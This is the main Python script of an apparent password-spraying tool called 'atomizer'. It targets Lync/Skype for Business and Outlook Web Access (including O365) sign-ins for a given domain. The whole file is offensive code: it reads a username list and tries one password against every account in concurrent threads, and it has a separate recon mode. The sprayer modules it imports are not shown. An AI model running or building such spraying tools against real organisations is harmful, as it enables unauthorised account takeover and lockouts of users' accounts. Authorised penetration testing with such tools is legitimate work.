#! /bin/env python3

"""
Usage:
    atomizer (lync|owa) <domain> <password> --userfile USERFILE [--threads THREADS] [--debug]
    atomizer (lync|owa) <domain> --recon [--debug]
    atomizer -h | --help
    atomizer -v | --version

Arguments:
    domain     target domain
    password   password to spray

Options:
    -h, --help               show this screen
    -v, --version            show version
    -u, --userfile USERFILE  file containing usernames (one per line)
    -t, --threads THREADS    number of concurrent threads to use [default: 3]
    -d, --debug              enable debug output
    --recon                  only collect info, don't password spray
"""

import logging
import signal
import asyncio
import concurrent.futures
import sys
from pathlib import Path
from docopt import docopt
from core.utils.messages import *
from core.sprayers import Lync, OWA


class Atomizer:
    def __init__(self, loop, domain, password, threads=3, debug=False):
        self.loop = loop
        self.domain = domain
        self.password = password
        self.sprayer = None
        self.threads = int(threads)
        self.debug = debug

        log_format = '%(threadName)10s %(name)18s: %(message)s' if debug else '%(message)s'

        logging.basicConfig(
            level=logging.DEBUG if debug else logging.INFO,
            format=log_format,
            stream=sys.stderr,
        )

        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.threads,
        )

    def lync(self):
        self.sprayer = Lync(
            domain=self.domain,
            password=self.password,
        )

    def owa(self):
        self.sprayer = OWA(
            domain=self.domain,
            password=self.password,
        )

    async def atomize(self, users):
        log = logging.getLogger('atomize')
        log.debug('atomizing...')

        log.debug('creating executor tasks')
        blocking_tasks = [
            self.loop.run_in_executor(self.executor, self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth, email.strip())
            for email in users
        ]

        log.debug('waiting for executor tasks')
        await asyncio.wait(blocking_tasks)
        log.debug('exiting')

    def shutdown(self):
        self.sprayer.shutdown()


if __name__ == "__main__":
    args = docopt(__doc__, version="0.0.1dev")

    loop = asyncio.get_event_loop()

    atomizer = Atomizer(
        loop=loop,
        domain=args['<domain>'],
        password=args['<password>'],
        threads=args['--threads'],
        debug=args['--debug']
    )

    if args['lync']:
        atomizer.lync()
    elif args['owa']:
        atomizer.owa()

    if not args['--recon']:
        userfile = Path(args['--userfile'])
        if not userfile.exists() or not userfile.is_file():
            print_bad("Path to --userfile invalid!")
            sys.exit(1)

        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, atomizer.shutdown)

        with open(args['--userfile']) as userfile:
            loop.run_until_complete(atomizer.atomize(userfile))
        atomizer.shutdown()
